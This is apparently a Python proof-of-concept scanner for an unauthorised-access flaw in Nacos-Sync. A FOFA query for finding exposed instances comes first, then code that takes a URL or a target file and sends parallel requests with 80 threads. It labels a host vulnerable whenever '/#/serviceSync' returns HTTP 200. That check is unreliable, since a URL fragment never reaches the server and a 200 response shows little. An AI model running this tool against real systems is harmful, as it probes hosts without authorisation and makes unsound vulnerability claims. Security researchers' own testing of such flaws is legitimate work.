#fofa : title=="Nacos-Sync"
#导包
import requests,sys,argparse,json
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """ 
 _     _      ____  _     _____  _     ____  ____  _  ____  _____ ____    ____  ____  ____  _____ ____  ____ 
/ \ /\/ \  /|/  _ \/ \ /\/__ __\/ \ /|/  _ \/  __\/ \/_   \/  __//  _ \  /  _ \/   _\/   _\/  __// ___\/ ___\
| | ||| |\ ||| / \|| | ||  / \  | |_||| / \||  \/|| | /   /|  \  | | \|  | / \||  /  |  /  |  \  |    \|    \
| \_/|| | \||| |-||| \_/|  | |  | | ||| \_/||    /| |/   /_|  /_ | |_/|  | |-|||  \_ |  \_ |  /_ \___ |\___ |
\____/\_/  \|\_/ \|\____/  \_/  \_/ \|\____/\_/\_\\_/\____/\____\\____/  \_/ \|\____/\____/\____\\____/\____/
                                                                                                                     
"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='Nacos-Sync未授权漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


#poc函数
def poc(target):
    payload = '/#/serviceSync'
    res = requests.get(url=target + payload,verify=False)
    if res.status_code == 200:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')

#函数入口
if __name__ =='__main__':
    main()

